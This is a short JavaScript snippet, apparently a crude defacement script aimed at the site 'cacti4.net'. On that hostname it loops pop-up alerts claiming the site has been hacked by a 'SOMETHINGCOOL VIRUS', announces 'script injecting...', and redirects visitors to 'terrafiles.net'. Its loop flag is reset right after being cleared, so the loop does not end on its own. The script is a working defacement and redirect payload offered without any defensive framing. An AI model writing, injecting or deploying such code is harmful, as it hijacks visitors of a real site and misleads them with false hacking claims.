var SOMETHINGCOOL = "cacti4.net";
var hello = 1
if (document.location.hostname === SOMETHINGCOOL) {
    while(hello === 1) {
        alert("CACTI.NET HAS BEEN HACKED BY SOMETHINGCOOL VIRUS")
        alert("YOU HAVE ALL BEEN HACKED BY SOMETHINGCOOL")
        alert("script injecting...")
        var hello = 2
        location.replace("https://terrafiles.net");
        var hello = 1
    }
}